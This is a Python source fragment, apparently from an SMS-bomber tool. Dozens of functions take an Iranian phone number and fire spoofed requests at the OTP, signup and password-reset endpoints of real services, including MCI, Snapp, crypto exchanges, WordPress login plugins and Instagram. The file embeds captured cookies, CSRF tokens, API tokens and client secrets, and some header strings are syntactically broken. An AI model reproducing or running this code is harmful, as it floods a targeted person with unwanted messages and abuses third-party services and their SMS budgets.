        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','Connection': 'keep-alive','content-length': '26','content-type': 'application/json;charset=UTF-8','host': 'api.dadhesab.ir','origin': 'https://app.dadhesab.com','referer': 'https://app.dadhesab.com/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.dadhesab.ir/user/entry",json=n4, headers=rhead)
            return True
        except:
            pass

    def dosma(phone):
        n4 = {"username":"0"+phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://app.dosma.ir/sendverify/",json=n4, headers=rhead)
            return True
        except:
            pass

    def ehteraman(phone):
        n4 = {"mobile":"0"+phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.ehteraman.com/api/request/otp",json=n4, headers=rhead)
            return True
        except:
            pass

    def flightio(phone):
        n4 = {"userKey":"98-"+phone.split('+98')[1],"userKeyType":1}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa_IR','client-v': '6.6.21','content-length': '43','content-type': 'application/json','devicetype': 'Windows','f-lang': 'fa','f-ses-id': 'ef807c51-7078-4711-81d5-c17b910c6fe5','origin': 'https://app.flightio.com','referer': 'https://app.flightio.com/profile/editprofile','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://app.flightio.com/bff/Authentication/CheckUserKey",json=n4, headers=rhead)
            return True
        except:
            pass

    def foodcenter(phone):
        #کد رو توی ریسپانس برمیگردونه
        n4 = f"mobile=0{phone.split('+98')[1]}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '138','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'FoodCity=kerman; __RequestVerificationToken=D4Xu-vyYOCqUz452OuzRFF1I_emQKm9byKT-VoABTIvDQ64wdL0FgwOxYmomz0VqlQzrPZVCgmzR3p8pBcZ54LZOwW01; ASP.NET_SessionId=5ycedcmb1ajoyctm2rw10ngf; KermanFoodUser=3cfccd41-4190-4f43-a37e-e42ffb586f0a; _ga_Q4305YKJE9=GS1.1.1660661382.1.0.1660661382.0; _ga=GA1.2.388015118.1660661383; _gid=GA1.2.1767121615.1660661384; _hjSessionUser_2820584=eyJpZCI6IjRhNzM5M2Y2LWFiNTAtNWI1ZS1hMTUxLTcyOTJhNGFjMDk3NiIsImNyZWF0ZWQiOjE2NjA2NjEzODQ3MDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2820584=eyJpZCI6IjYzMmNkYjJjLWU5MDAtNGM1MC1hM2Q3LTczMjY5NTM2NWJiYSIsImNyZWF0ZWQiOjE2NjA2NjEzODUyNjYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1','origin': 'https://www.foodcenter.ir','referer': 'https://www.foodcenter.ir/kerman/category/cafe?submenu=27','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://www.foodcenter.ir/account/sabtmobile",data=n4, headers=rhead)
            return True
        except:
            pass

    def shop_mci(phone):
        n4 = {"msisdn":phone.split('+98')[1]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
            return True
        except:
            pass

    def mci(phone):
        n4 = {"msisdn":phone.split('+98')[1]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '9f740bf9-817a-4539-bb1d-43790fc93b75','content-length': '23','content-type': 'application/json','origin': 'https://pwa.mci.ir','referer': 'https://pwa.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
            return True
        except:
            pass

    def hamrahbours(phone):
        n4 = {"MobileNumber":"0"+phone.split('+98')[1]}
        rhead = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b','authorization': 'Bearer undefined','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.hbbs.ir','origin': 'https://app.hbbs.ir','referer': 'https://app.hbbs.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.hbbs.ir/authentication/SendCode",json=n4, headers=rhead)
            return True
        except:
            pass

    def homtick(phone):
        n4 = {"mobileOrEmail":"0"+phone.split('+98')[1],"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://auth.homtick.com/api/V1/User/GetVerifyCode",json=n4, headers=rhead)
            return True
        except:
            pass

    def iranamlaak(phone):
        n4 = {"AgencyMobile":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",json=n4, headers=rhead)
            return True
        except:
            pass

    def karchidari(phone):
        n4 = {"mobile":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.kcd.app/api/v1/auth/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def kardoon(phone):
        n4 = {"optype":15,"userid":0,"mobile":"0"+phone.split('+98')[1],"firstname":"","lastname":"","cityid":0,"email":"","birthdate":"","gender":False,"avatarid":0,"packagename":"","versioncode":-1,"tokenkey":"","username":"","password":"","connectionname":"MainConStr"}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://app.kardoon.ir:4433/api/users",json=n4, headers=rhead)
            return True
        except:
            pass

    def mazoo(phone):
        n4 = {"phone":phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://mazoocandle.ir/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def ostadkr(phone):
        n4 = {"mobile":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.ostadkr.com/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def paymishe(phone):
        n4 = {"mobile":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
            return True
        except:
            pass

    def nesengrill(phone):
        n4 = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
        except:
            pass

    def sizdah50(phone):
        n4 = {"apiToken":"BYE7T3P73xwG8KKjUemqnpmtfi3CFKHt00w92hlBpGODB4dta45Z6qtVwUbvAM1s","clientSecret":"DJXBtleZru9SVf9uVnoG63E2I6dxzvkB","device":"web","username":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
        except:
            pass

            
    def zerocafe(phone):
        n4 = {"apiToken":"DBpPbfB2X7ZTnSyrugfKWuLoDbjn5VXAPgqVengvZznDEWoJV0y6x4GS1AL06Y7B","clientSecret":"51NZdnUk0cJClzlQCpz0S9YwMM0Fx9t2","device":"web","username":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
        except:
            pass

    def podro(phone):
        n4 = {"username":phone.split('+98')[1],"otp_provider":"INTERNAL","profile":{"name":"","national_code":""},"companies":[{"name":"kljkjjhhjjhde66","slug":"kljkjjhhjjhde66"}]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer','connection': 'keep-alive','content-length': '158','content-type': 'application/json','host': 'api.podro.com','origin': 'https://shop.podro.com','referer': 'https://shop.podro.com/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.podro.com/back4front/accounts/register",json=n4, headers=rhead)
            return True
        except:
            pass

    def rayshomar(phone):
        n4 = f"MobileNumber=0{phone.split('+98')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','app-version': '2.0.6','content-length': '24','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','language': 'fa','origin': 'https://app.rayshomar.ir','os-type': 'webapp','referer': 'https://app.rayshomar.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.rayshomar.ir/api/Register/RegistrMobile",data=n4, headers=rhead)
            return True
        except:
            pass

    def refahtea(phone):
        n4 = f"action=refah_send_code&mobile=0{phone.split('+98')[1]}&security=c68b01b32a"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '61','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://refahtea.ir','referer': 'https://refahtea.ir/register/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

    def shahrhayejadid(phone):
        n4 = f"mobile=0{phone.split('+98')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '18','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_gid=GA1.2.1080945716.1660661403; _ga_Q8S46CK37V=GS1.1.1660661403.1.1.1660662187.0; _gat_gtag_UA_148737608_1=1; _ga=GA1.1.702864792.1660661403; XSRF-TOKEN=eyJpdiI6IkFqaEZnMUZtRFFWa2txM09LUUc1WWc9PSIsInZhbHVlIjoiRTJIMnNaaThCZ3pSdC9FRi9kTWxZNUlJSUVEUnJRWFhXRUZJR2IwN0pFV2Y5cDlUNWNvV09YeUcwSWJVbEtQQlFOVE5iWittdlVrckxhSCtYTTFKdk9QZHh4SjdsQlJ4aXlNQWxFSFRnMzg0MkppVHIvcDNVdGNwckdjUVJiOXUiLCJtYWMiOiIyMWI5YWE4NDFhOTEzMGY3OWI2ZjRhMjk3MWVjYzRkZGEyZmU3ZjQwM2JkNjE4MjIxNzRiNmFiNTYyNjNhMDYyIn0%3D; shahrhayejadid_session=eyJpdiI6IjNmWElNV2tCM1dzY3VYRS8xYzdSc1E9PSIsInZhbHVlIjoiYW5FaGNJN2Rhb0M4MlQvT1V5a2gwY0IyYjlKS2tSY2tpc0xXNnZPbnV0bDRKK0Z2b0o5SGI0NHBIN2syU1F5c0k5Wjg4YVRqTFR1RXpCU3NrSG5FNFJPM3A1bVB6YUZQanNrS2Y0S1poK1piZWxkVUtZYmFqazR4eDhrM0tTdWQiLCJtYWMiOiJlMDkxNWMxODU3M2FkZWUwYTk1NzM1NmM5ZWFiMDZmNTdlMjRkNDZkYTRjNjBmZmFhODcxOTdmYTQ0OTc0MTAzIn0%3D','origin': 'https://shahrhayejadid.com','referer': 'https://shahrhayejadid.com/login','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-csrf-token': 'oREBtfHBdXTuDytkhWwjwSY4gtWHnCJEfbBmAaPN','x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def snapp_drivers(phone):
        n4 = {'cellphone':'0'+phone.split('+98')[1]}
        rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
        try: 
            post(url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",json=n4, headers=rhead)
            return True
        except:
            pass
            
    def mamifood(phone):
        n4 = {'Phone':'0'+phone.split('+98')[1]}
        rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
        try: 
            post(url="https://mamifood.org/Registration.aspx/SendValidationCode",json=n4, headers=rhead)
            return True
        except:
            pass

            
    def uphone(phone):
        n4 = {"mobile":"0"+phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://server.uphone.ir/api/v1/login/otp/request",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def abantether(phone):
        n4 = {"phoneNumber":"0"+phone.split('+98')[1],"email":""}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://abantether.com/users/register/phone/send/",json=n4, headers=rhead)
            return True
        except:
            pass

    def amoomilad(phone):
        n4 = {"Token":"5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+phone.split('+98')[1],"Helper":77942}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",json=n4, headers=rhead)
            return True
        except:
            pass
            
    def ashraafi(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+98')[1]}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={phone.split('+98')[1]}&dig_otp=&dig_nounce=54dfdabe34"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '203','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://ashraafi.com','referer': 'https://ashraafi.com/login-register/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    
        try: 
            post(url="https://ashraafi.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
    def bandarazad(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '276','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://bandarazad.com','referer': 'https://bandarazad.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbandarazad.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://bandarazad.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def bazidone(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+98')[1]}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split('+98')[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '229','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://bazidone.com','referer': 'https://bazidone.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbazidone.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://bazidone.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def bigtoys(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '351','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://www.bigtoys.ir','referer': 'https://www.bigtoys.ir/?login=true&back=home&page=1','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
    def bitex24(phone):
        HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','lang': 'null','origin': 'https://admin.bitex24.com','referer': 'https://admin.bitex24.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try:
            get(url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{phone.split('+98')[1]}&dial_code=0", headers=HEADER)
        except:
            pass

            
    def candoosms(phone):
        n4 = f"action=send_sms&phone=0{phone.split('+98')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.candoosms.com','referer': 'https://www.candoosms.com/signup/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.candoosms.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def farsgraphic(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+98')[1]}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '413','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://farsgraphic.com','referer': 'https://farsgraphic.com/?login=true&page=1&redirect_to=https%3A%2F%2Ffarsgraphic.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://farsgraphic.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def glite(phone):
        n4 = f"action=logini_first&login=0{phone.split('+98')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.glite.ir','referer': 'https://www.glite.ir/user-login/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.glite.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def instagram(phone):
        n4 = f"email_or_username=%2B{phone.split('+')[1]}&recaptcha_challenge_field=&flow=&app_id=&source_account_id="
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '93','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/password/reset/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-asbd-id': '198387','x-csrftoken': 'Rrz9lCCmwSAiSQmLsGwURFlco3sYs1Rm','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '315e7d00695c','x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.instagram.com/accounts/account_recovery_send_ajax/",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def hemat(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://shop.hemat-elec.ir','referer': 'https://shop.hemat-elec.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.hemat-elec.ir%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def kodakamoz(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '554','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.kodakamoz.com','referer': 'https://www.kodakamoz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.kodakamoz.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def mipersia(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '277','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://www.mipersia.com','referer': 'https://www.mipersia.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.mipersia.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://www.mipersia.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def novinbook(phone):
        n4 = f"phone=0{phone.split('+98')[1]}"
